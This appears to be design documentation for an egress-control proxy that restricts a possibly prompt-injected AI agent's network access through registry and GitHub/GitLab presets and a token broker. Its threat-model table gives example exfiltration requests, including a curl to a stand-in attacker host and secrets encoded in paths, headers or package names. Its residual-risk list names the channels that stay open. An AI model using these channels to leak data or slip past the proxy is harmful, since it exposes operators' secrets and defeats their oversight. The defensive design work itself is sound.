# Service presets

A service preset is one `services:` entry in config.yaml that grants a named
service exactly the egress it needs. Two kinds ship:

- **Registry presets** (`go`, `npm`, `docker`, `ghcr`, `pypi`, `crates`) —
  read-only access to package registries as *restricted hosts*, enforced by
  the rule engine in `registries.py`. No credential.
- **Scoped API presets** (`github`, `gitlab`) — the service's API host is
  *restricted*, not allowlisted: the entry names the repos/orgs (GitHub) or
  projects/groups (GitLab) an agent may touch, and the preset compiles that
  into the same rule engine registry presets use. The API token is also
  brokered — a separate control from the scoping, see "Credential presets"
  below.

```yaml
# config.yaml
services:
  - go
  - npm
  - service: github
    scope:
      repos: [myorg/myrepo, myorg/other]
      orgs:  [myorg-sandbox]           # every repo under this org
    write: true                        # opt in to issue/PR/comment writes
    fake_value: "ghp_0000000000000000000000000000000000fake"
    real_value: "${GITHUB_TOKEN}"      # ${KEY} resolved from secrets_file
  - service: gitlab
    host: gitlab.example.com           # self-hosted: the entry supplies the host
    scope:
      projects: [team/backend]
      groups:   [team/sandbox]
    fake_value: "glpat-00000000000000fake"
    real_value: "${GITLAB_TOKEN}"
```

An entry with `enabled: false` is validated and expanded the same way but
grants nothing: its config (scope, flags, token reference) stays put until
it's switched back on, or temporarily enabled from the TUI or
`POST /services/temp-enable` — an in-memory grant that ends on expiry,
restart, or an explicit toggle.

Presets are descriptors (`services.py`), expanded at config load into the
proxy's existing primitives — the unified `hosts:` policy (unrestricted or
rule-restricted) and credential broker entries. The two enforcement engines
stay separate.

# Registry presets: restricted read-only access to package registries

Agents constantly need to download packages (Go modules, npm packages, container
images). Fully allowlisting a registry host would open exfiltration channels:
POST bodies, free-form URLs and query strings, arbitrary headers. Registry
presets add a third access tier between "fully allowed" and "denied" —
**restricted hosts** — with curated per-registry rules that permit the read-only
download traffic these ecosystems need while structurally closing the channels
that could carry sandbox data out.

## Threat model

The agent is assumed potentially compromised (e.g. by prompt injection). The
question for every field of a "read-only" request is: *can it carry arbitrary
sandbox data to an attacker-readable sink?*

### Channels closed hard

These are structural channels that could carry arbitrary bytes to arbitrary
receivers. They are closed outright:

| Channel | Example attack | Mitigation |
|---|---|---|
| Hostname | `curl https://exfil.attacker.com/…` | Presets pin exact hostnames; anything else stays in the normal allow/deny flow. |
| Path | `GET /v2/x/blobs/<base64(secret)>` | Anchored `fullmatch` patterns with bounded segment lengths and tight character classes; max URL length 4096; `..` and `%2e` rejected; literal `%` only where a rule opts in. |
| Query string | `?q=<secret>` | Per-rule query-param allowlist with per-value patterns; the default is *no query string at all*. This closes e.g. npm search (`/-/v1/search?text=…`). |
| Request headers | `X-Data: <secret>`, `Cookie:` leaking sandbox cookies | Header allowlist (base set + per-preset extras); unknown headers are dropped and their *names* logged; values are length-capped. |
| Request body | npm audit POST carries the full dependency tree; an API write body can carry arbitrary data | Registry presets: no rule sets `allow_body`, so any body is a violation. API presets (`github`/`gitlab`): a body is permitted only on the specific routes `write: true` adds, capped at 64KiB and pinned to `application/json` — see "The body channel is not inspected" below. |
| Method | POST/PUT/DELETE side effects (package upload!) | Per-rule method sets; registry presets are GET/HEAD only, API presets add POST/PATCH/PUT only under `write: true`. |
| GraphQL body | `POST /graphql` addressing an out-of-scope repo via `repository(owner:,name:)`, `viewer`, `search`, or an opaque `node(id:)` global ID | Denied outright; `graphql: true` removes this protection entirely, logged as `service_flag_unscoped` — see "Why `POST /graphql` is denied by default" below. |

Design choice: patterns are **grammar-based, not entropy-based**. Instead of
trying to detect "too much entropy" in a request, each path segment is
constrained to a character class with an explicit length bound. What remains
expressible (package names, versions, digests) is a channel whose only
receivers are the registry operators themselves — see below.

A useful observation about headers: once hostname, path, and query are pinned,
header values can only reach the registry operator (Google, npm Inc., Docker
Inc., GitHub, PSF, the crates.io team), whose request logs are not
attacker-readable. Header scrubbing therefore mainly prevents *accidental*
credential leakage (cookies, tokens) and protocol tricks (`Upgrade:` is not
allowlisted, so no WebSocket), rather than closing an attacker-readable
channel. That is why values are bounded, not normalized.

#### Why `POST /graphql` is denied by default

Every other rule in this document works by pinning the *path*: the repo (or
project) name is a literal in the compiled pattern, so a request for anything
else doesn't match. GraphQL breaks that assumption — the path is always
`POST /graphql`, and the repo identity moves into the request body, which the
rule engine deliberately does not parse (see "The body channel is not
inspected" below). Even if it did, GitHub's GraphQL schema gives several ways
to reach a repo that don't go through a literal owner/name at all:
`repository(owner: "x", name: "y")` reintroduces the literal, but `viewer`,
`search(query: "...")`, and `node(id: "...")` do not — `node` takes an opaque
global ID (a base64 blob with no textual relationship to a repo name) that
can only be resolved back to a repo by asking GitHub itself. There's no
pattern to compile. Scoping GraphQL soundly has to happen at the token — a
fine-grained PAT limited to the same repositories — not at the proxy, which
is exactly what `graphql: true` hands off: the flag adds a `POST /graphql`
route (64KiB body cap, JSON content-type) with no repo constraint at all, and
is logged as `service_flag_unscoped` (service, flag name) every time the
config loads it, same as `unrestricted: true` below.

Practical consequence: the GitHub CLI's `gh pr list`, `gh issue list`, and
similar read commands go through `gh api graphql` under the hood and fail
against a scoped-without-`graphql` service (503, `policy_violation`).
`gh api repos/<owner>/<repo>/pulls` — REST, path-scoped — works against an
in-scope repo.

### Scoping GitHub and GitLab

`github` and `gitlab` are API presets: like registry presets, their host is
*restricted* through `registries.HostRules`, not allowlisted. What's
different is that the rule set isn't fixed at preset-definition time — it's
parameterized by the repos/orgs (GitHub) or projects/groups (GitLab) the
operator names under the entry's `scope:` key, and compiled fresh from that
at config load.

```yaml
- service: github
  scope:
    repos: [myorg/myrepo, myorg/other]   # exact owner/repo
    orgs:  [myorg-sandbox]               # every repo directly under this org
  write: true                            # opt in to issue/PR/comment writes
  graphql: true                          # opt in to POST /graphql (UNSCOPED)
```

`repos` (`owner/repo`, exact match) and `orgs` (owner only, granting every
repo under that owner — GitHub repo paths are always exactly `owner/repo`,
so there's no deeper nesting to bound the way GitLab's `groups` needs to) are
the two `github` scope params; `gitlab` has `projects`
(`namespace[/subgroup...]/project`, up to 10 path segments) and `groups`
(same shape, up to 9 subgroup segments) plus a required scalar `host:` naming
the self-hosted instance. `write` (both presets) adds issue/PR/MR/comment
POST/PATCH/PUT routes; `graphql` (`github` only) is covered above. At least
one scope param must be supplied — an entry with `scope: {}` or all-empty
lists is rejected the same as a missing `scope:` key.

Every raw value under `scope:` is checked against its param's pattern with
`re.fullmatch`, then run through `registries.literal_alternation` — the one
place operator-supplied text is escaped into regex — before it ever reaches
the rule builder (`_github_rules`/`_gitlab_rules` in `services.py`). Those
builders receive only the escaped, case-insensitive alternation text, never a
raw string, so a preset author can't forget to `re.escape` it. The compiled
rules are ordinary `registries.HostRules`, checked with the identical
guardrails as every other pattern in this codebase (anchored `fullmatch`,
bounded quantifiers, no opaque `/`-matching repeat). An org/group boundary is
enforced explicitly, not just by the character class: `myorg`'s compiled
alternative is `myorg` followed by a literal `/`, so it cannot prefix-match
`myorg-evil/repo`. GitLab project IDs are `%2F`-encoded paths, which needs
`allow_percent: true` per rule; the encoded separator is spelled out as an
explicit `%2[fF]` alternative rather than a free `%` character class, so it
can't be repurposed to smuggle other percent-encoded bytes past the
`%2e`-traversal check.

**Why scope is expressed this way (`scope: {repos: [...]}`) instead of
letting an entry carry a hand-written path regex the way a custom `hosts:`
entry can:**

- A hand-rolled path regex fails *open* and silently. `/repos/acme/web/`
  without an explicit boundary also matches `/repos/acme/web-internal` — the
  mistake doesn't show up until it's already too permissive.
- Operator-supplied names need `re.escape`; a per-operator hand-written regex
  has no single place to centralize that (an org literally named `a.b` would
  become an unintended wildcard). `literal_alternation` is that place, and a
  scope param routes every operator string through it uniformly.
- The TUI can prompt "which repos?" (a list of strings) but not "paste a rule
  set" — the latter would push GitHub/GitLab scoping back to hand-editing
  YAML and defeat the service editor.
- GitHub and GitLab's path shapes drift over time. Keeping the rule sets in
  `services.py`, next to `registries.PRESETS`, means one upgrade there fixes
  every operator's config instead of every operator's regex needing a fix.

The raw-rules escape hatch from "Custom restricted hosts" (below) still
applies here: a hand-written `hosts:` entry naming `api.github.com` (or the
GitLab instance host) overrides whatever the preset compiled for that host,
exactly as it would for any preset-managed host. That's the way out when the
built-in scope templates don't express what's needed.

**`unrestricted: true`** is the explicit opt-out from scoping. Every
scopable preset requires exactly one of `scope:` or `unrestricted: true`; an
entry with neither is a hard config-load error, not a warning:

> `services[i] (github) must be scoped: set 'scope:' (available params:
> ['orgs', 'repos']) or 'unrestricted: true' to explicitly opt out of
> scoping`

Setting `scope:` and `unrestricted: true` together is also a hard error —
they're mutually exclusive. With `unrestricted: true`, every host the entry
could otherwise touch (the fixed `api.github.com`, or the operator-supplied
GitLab host, plus the credential host) is granted blanket access — no rule
engine, back to the pre-scoping behavior — and each host grant is logged
individually as a `service_unrestricted` event (`service`, `host`). This is
legitimate when the workflow genuinely needs the token's full reach (e.g. an
agent that has to discover repos it doesn't already know the names of) and
the operator is accepting that trade consciously; the log line is what makes
it an accepted, audited choice rather than a silent gap.

### Residual risks — accepted and logged

These are low-bandwidth semantic sinks that cannot be closed without breaking
the feature. Every allowed request is logged with its full path, so all of them
are auditable after the fact.

1. **Package-name existence oracles.** An attacker can publish a package named
   after data they want to receive (`npm install exfil-a3f9…`) and observe the
   download through public download-count APIs (npm replicate feed, pypistats,
   crates.io download counts, Docker Hub pull counts). Bandwidth: up to ~214
   constrained characters per request, observable with hours-to-days latency at
   coarse granularity. Closing this requires a package-level allowlist (e.g.
   derived from lockfiles) — listed under future hardening.
2. **Go module proxy as a fetch forwarder.** Requesting an attacker-hosted
   module makes proxy.golang.org fetch from the attacker's VCS on a cache miss;
   the attacker's server logs then reveal the requested version string (~100
   semver-charset characters per request).
3. **High-entropy digest fields.** An OCI blob request carries
   `sha256:<64 hex>` — 32 arbitrary bytes. But an unknown digest simply 404s at
   the registry, and pull-count oracles are repository-level, not digest-level,
   so those bytes reach only the registry operator. Digests are constrained to
   exactly `sha256:` + 64 hex characters. The same reasoning applies to signed
   CDN query parameters (Cloudflare/Azure blob URLs), which are registry-issued
   and bounded.
4. **Timing and request-count channels.** Inherent to allowing any network
   access at all.
5. **The body channel is not inspected.** `write: true` and `graphql: true`
   bodies are size-bounded (64KiB) and media-type-pinned (`application/json`)
   — and that is the entire check. Once a write is permitted to an in-scope
   repo, its content is arbitrary: an issue title, a comment body, a
   GraphQL mutation payload can carry anything the agent can produce. Repo
   scoping bounds *which* repos are reachable, not what gets written into
   them, and a public repo — or a private one with external collaborators —
   is a readable sink an attacker only has to watch.
6. **Free-text query values on the `gitlab` preset.** Without `write: true`,
   `glab issue list`'s `search`, `milestone`, `labels` and `not[labels]`
   filters and the milestone `title` lookup still accept short free text:
   up to 255 printable-ASCII characters per value (up to 20 labels per list),
   bounded overall by the 4096-character URL limit. The other read-only
   rules only accept ref-, path- and id-shaped values. These values reach the
   GitLab instance's request logs, so a read-only scope is not a zero-write
   channel to whoever can read those logs. Every such request is logged with
   its full query.

Out of scope entirely (unchanged trust model): prompt injection via *response*
content, and compromise of a registry itself.

**The credential itself must also be scoped — this is the other half of the
control, not an optional hardening step.** The proxy's rules stop a token
from being *used* beyond the repos/orgs (or projects/groups) an operator
named, and they produce an audit log entry for every request. They cannot
stop a broadly-scoped token from being valid for more than that — the proxy
only sees the requests it's asked to forward, not what the token could
authorize elsewhere. Issue a GitHub fine-grained personal access token
limited to the selected repositories, or a GitLab project access token
limited to the selected project(s), and use *that* as `real_value`. A
classic GitHub PAT or an instance-wide GitLab token defeats half of what this
feature buys: the proxy-side rules still apply, but a leaked or misdirected
credential is valid for everything the token holder can reach, not just the
repos named in `scope:`.

## How enforcement works

A host can carry several entries: whatever enabled service presets generate
for it, then its hand-written `hosts:` entries, in config order, then the
entries of any temporarily enabled service, plus — while one is active — a
temporary allow (TUI/management API) appended as a final unrestricted
entry. Each entry permits requests on its own terms, and entries
only ever add access; none narrows another. Request evaluation in the proxy:

1. If the request presents the `fake_value` of some entry's swap-mode
   credential (the credential's header carries exactly that value), those
   entries are tried first, in config order. This honors the client's
   explicit ask for authenticated access, so an earlier unauthenticated entry
   covering the same path can't silently shadow the credentialed one.
2. Then every other entry, in config order. An unrestricted entry (no
   `rules:`, or a temporary allow) permits unconditionally — the operator's
   explicit broader grant, and the escape hatch when a preset pattern blocks a
   legitimate workflow. A restricted entry permits if its rules match; only
   the permitting entry's header scrubbing applies (non-allowlisted request
   headers are dropped, names logged, never values).
3. The first entry to permit wins, and the request proceeds with *that*
   entry's credential, if it has one (see "Credentials are bound to entries"
   below).
4. If entries exist but none permits → **503** with `Retry-After: 5` and a body
   explaining the first rejecting entry's violation, identical in shape to the
   pending-approval response below — a human may grant a temporary allow
   moments later, so the client should keep retrying rather than treat this as
   final.
5. No entries at all → 503, pending human approval (existing flow).

### Credentials are bound to entries

A credential is declared on a `hosts:` entry (`credential:`, see the
`credentials` example in `config.default.yaml`) or generated onto one by a
`github`/`gitlab` service, and is brokered only for requests *that entry*
permits. When the permitting entry has no credential, the header of any
credential declared on a sibling entry is stripped before forwarding (logged
as `credential_withheld`, header names only) instead of letting the client's
fake token — or whatever else it put there — through. So an unauthenticated
read-only entry and an authenticated scoped one can share a host (the
`two-entries` example in `config.default.yaml`), and a temporary allow,
permanent allow, or unrestricted `hosts:` entry on a host with a scoped
`github`/`gitlab` service opens the host *without* the token: out-of-scope
requests go upstream unauthenticated, never with the real value.

The client-facing response is deliberately the same for both denial kinds.
Violations remain distinguishable to *operators*: they appear in the deny log
and TUI tagged `type: policy_violation` with a `reason` — an agent POSTing to
npm is exactly what an operator should see — whereas an unconfigured host is
tagged `type: pending_approval`.
Allowed registry requests are logged with a `registry: <preset>` field.

Response side: cookie filtering follows the entry that permitted the request.
Restricted entries strip all `Set-Cookie` headers by default (registries don't
need cookies; they are a session/tracking channel into the sandbox); a custom
`hosts:` entry can set its own `allow_response_cookies`. A temporary allow
keeps the cookie policy of the host's first configured entry.

### Base request-header allowlist

`host`, `accept`, `accept-encoding`, `user-agent`, `connection`,
`content-length`, `range`, `if-none-match`, `if-modified-since`, `te` — with
per-value length caps (256 bytes default; larger for `accept`, `user-agent`,
and `authorization` where declared). Presets that need OCI token auth
(`docker`, `ghcr`) additionally allow `authorization`: those Bearer tokens are
issued by the registry itself seconds earlier over the same constrained
channel, and the token endpoints pin the requested scope to `:pull`, so even a
leaked push credential cannot be exercised through the proxy.

## Presets

| Preset | Hosts | Allows |
|---|---|---|
| `go` | `proxy.golang.org`, `sum.golang.org` | Module list/info/mod/zip, `@latest`, and the checksum DB — including the `/sumdb/…` paths the toolchain fetches *through* the module proxy. |
| `npm` | `registry.npmjs.org` | Packuments (incl. scoped `@scope/name` and the `%2f`-encoded form) and `/-/…tgz` tarballs. |
| `docker` | `registry-1.docker.io`, `auth.docker.io`, `production.cloudflare.docker.com`, `production.cloudfront.docker.com` | `/v2/` ping, manifests, blobs, pull-scoped tokens, and the CDN hosts blob GETs redirect to (Cloudflare or CloudFront, varies over time/region). |
| `ghcr` | `ghcr.io`, `pkg-containers.githubusercontent.com` | Pull-scoped tokens, manifests, blobs, and the blob CDN redirect target. |
| `pypi` | `pypi.org`, `files.pythonhosted.org` | Simple index (PEP 503), JSON API, and package files. |
| `crates` | `index.crates.io`, `crates.io`, `static.crates.io` | Sparse index, the API download endpoint, and `.crate` files. |
| `github` | `api.github.com`, scoped to `scope.repos`/`scope.orgs` | Repo metadata, contents, commits, branches, pulls, issues, and git refs/trees/blobs (read-only). `write: true` adds issue/PR/comment POST/PATCH; `graphql: true` adds unscoped `POST /graphql`. |
| `gitlab` | the entry's `host:`, scoped to `scope.projects`/`scope.groups` | The `/api/v4/projects/{id}` equivalent of the above: files, commits, branches, merge requests, issues (with `glab issue list`'s filter parameters) and issue comments, milestone lookup by title, repository tree/blobs (read-only), plus the token's own user (`GET /api/v4/user`, which `glab auth login`/`auth status` need). `write: true` adds issue/MR/note POST/PUT, issue subscribe/unsubscribe, and issue time tracking. |

Rule definitions live in `registries.py` (`PRESETS`) for registry presets and
in `services.py` (`_github_rules`, `_gitlab_rules`) for the API presets; git
history for either is the audit trail for policy changes.

### Known client-side friction

- **npm audit and search are blocked by design.** The audit POST body encodes
  the entire dependency tree — a high-bandwidth channel via invented package
  names. npm treats audit failure as non-fatal, but to silence the warning run
  `npm install --no-audit` or set `audit=false` in `.npmrc`.
- **`gh pr list`, `gh issue list`, and similar GitHub CLI commands fail**
  against a scoped `github` service without `graphql: true` — they go through
  `gh api graphql` under the hood, and `POST /graphql` is denied by default
  (see "Why `POST /graphql` is denied by default" above). `gh api
  repos/<owner>/<repo>/pulls` and other REST-shaped `gh api` calls against an
  in-scope repo work normally.
- **Some `glab issue` options are not covered by a scoped `gitlab` service.**
  `--attach` (a binary upload to `/uploads`), `issue delete`, `--group` and
  `--epic` listings (group endpoints, outside the project scope),
  `--linked-issues`, and `--assignee`/`--author <username>` (an instance-wide
  `/users` lookup) are denied; `--assignee=@me`, `@none` and `@any` work.
  Search terms, label and milestone names are limited to printable ASCII.
- If a preset pattern turns out too tight for a legitimate workflow, the
  violation shows up in the TUI; temp-allowing the host is the immediate
  escape hatch, and a custom `hosts:` entry (added alongside the preset's
  entry for that host) is the durable fix. Neither carries a `github`/
  `gitlab` service's credential: requests only they permit go upstream
  unauthenticated. A custom entry that needs the token declares its own
  `credential:`.

## Custom restricted hosts

The same engine is available for your own hosts, as a `hosts:` entry with a
`rules:` list — see the `restricted-host` example in `config.default.yaml`
for the full shape (`methods`, `path`, `query`, `request_headers`).

Guardrails apply to user rules exactly as to presets: patterns are anchored
(`fullmatch`), unbounded quantifiers (`*`, `+`, `{n,}`) are rejected at load
time, and a literal `%` in a path pattern requires `allow_percent: true` on the
rule. A rule's `query` may use the special key `"*"` to allow any parameter
name (≤40 chars, `[A-Za-z0-9_.-]`) against one value pattern — intended for
CDN-signed URLs.

This is also the escape hatch for `github`/`gitlab`: a `hosts:` entry naming
`api.github.com` (or a self-hosted GitLab's host) with its own `rules:` list
adds to what the `scope:`-driven preset compiled for that host, for a shape
the built-in scope templates don't cover. It gets the token only if it
declares a `credential:` of its own (header `Authorization` with value
`token <t>` for GitHub, `PRIVATE-TOKEN` with the bare token for GitLab).
Because entries only add access, it can't *narrow* a service's access —
scope the service itself for that.

# Credential presets: brokered API tokens

The credential broker (`CredentialBrokerAddon`) already ensured real secrets
never enter the sandbox: the agent's CLI is configured with a fake token, and
the proxy replaces it with the real one on the way out (swap mode). A request
carrying any other non-empty value in the credential header is blocked with a
403 and logged — an agent that was prompt-injected into using a stolen or
invented token gets caught, not forwarded.

Credential presets add the per-service knowledge, so one entry wires
everything:

| Preset | Host | Header the CLI sends | Fake-token shape |
|---|---|---|---|
| `github` | `api.github.com` (fixed) | `Authorization: token <t>` | `ghp_` + 36 chars |
| `gitlab` | from the entry's `host:` (self-hosted) | `PRIVATE-TOKEN: <t>` | `glpat-` + 20 chars |

The entry's `fake_value`/`real_value` are the bare tokens; the preset wraps
them in the header format its CLI actually sends (`token …` for `gh`, no
prefix for `glab`). The fake-token shape matters because CLIs validate token
format locally before sending anything.

Credential brokering and host scoping are two independent controls that
happen to be configured from the same entry. Brokering (this section) governs
*whether the real token ever reaches the sandbox*; it always runs, regardless
of scoping. Scoping (see "Scoping GitHub and GitLab" above) governs *which
requests the proxy will forward at all*. For `go`/`npm`/`docker`/`ghcr`/
`pypi`/`crates` there's no credential, so only the registry's own restricted
rule set applies. For `github`/`gitlab` the credential's host is not
allowlisted by default the way earlier versions of this feature did it — it
is compiled into the same restricted rule set `scope:` produces (or, under
`unrestricted: true`, granted blanket access), and the credential is
attached to that entry. (`allow_host: false`, which used to broker the token
without granting its host any access, is now a config error: a credential
fires only for requests its own entry permits, so it would never fire. Put a
`credential:` on the hand-written `hosts:` entry instead.) Any credential on
a restricted entry — preset-generated or hand-written — has its header
(`authorization` for `github`, `private-token` for `gitlab`) added to that
entry's `request_headers` automatically, so header scrubbing can't strip it
before the broker runs: `AllowlistAddon` scrubs before
`CredentialBrokerAddon` swaps the token in. The rule builders
separately add `content-type` to `request_headers` whenever `write` or
`graphql` is set, since those routes carry a JSON body.

## Real tokens never leave the proxy side

- Keep real values in `secrets_file` (outside the repo and the sandbox) and
  reference them as `${GITHUB_TOKEN}`; config.yaml then contains no secret.
- The management API never returns credential values — endpoints serialize
  hostnames and rule sources only, and config rewrites round-trip the raw
  `${KEY}` reference, never the expanded secret. A regression test
  (`test_real_credential_never_appears_in_any_response`) pins this.
- Logs record that a swap happened (`credential_injected`: host, header,
  mode) — never the real value. A mismatch logs the *expected fake* only.

## Future hardening (not implemented)

- **Lockfile-derived package allowlists** — closes the existence-oracle channel
  by only permitting known dependency names.
- **Digest provenance tracking** — only allow blob digests previously seen in
  an allowed manifest response; the proxy sees manifest bodies, so this is
  feasible and would fully close the digest channel.
- **404-rate alarms / rate limiting** — flag probing and timing channels.
- **Proxy-side OCI token brokering** — the proxy performs the token dance so
  the agent never holds registry tokens.
- **`module_prefixes` for the Go preset** — pin the module universe for teams
  with a known dependency set, closing the fetch-forwarder channel.
- **npm audit opt-in** (`allow_audit`) for setups that accept the dependency
  tree disclosure.
- **Git-over-HTTPS (clone/fetch/push)** for `github`/`gitlab`. Deliberately
  out of scope for this change — only the REST/GraphQL APIs are scoped today.
  `git clone https://github.com/...` still needs its own `hosts:` entry or a
  temp-allow, so blanket git access is reduced by this feature, not
  eliminated, until a follow-up lands. Two pieces are already in place for
  that follow-up: `allow_body` (git's smart-HTTP `git-upload-pack`/
  `git-receive-pack` are POSTs with a body) and the `{REPOS}` alternation
  builder. The one genuinely new piece is a **second credential per
  service**: git-over-HTTPS authenticates with HTTP Basic (the token as the
  password), not `Authorization: token <t>`, so `ServicePreset.credential`
  would need to become host-keyed, with both entries wrapping the same
  operator-supplied token.
- **A GraphQL body parser**, as an alternative to the blanket `graphql: true`
  opt-out — parse the query/mutation and check every `repository(owner:,
  name:)`/`node(id:)` reference against the entry's scope. Deferred; `node`'s
  opaque global IDs would need a GitHub lookup to resolve, which is a
  meaningfully bigger change than anything else in this feature.
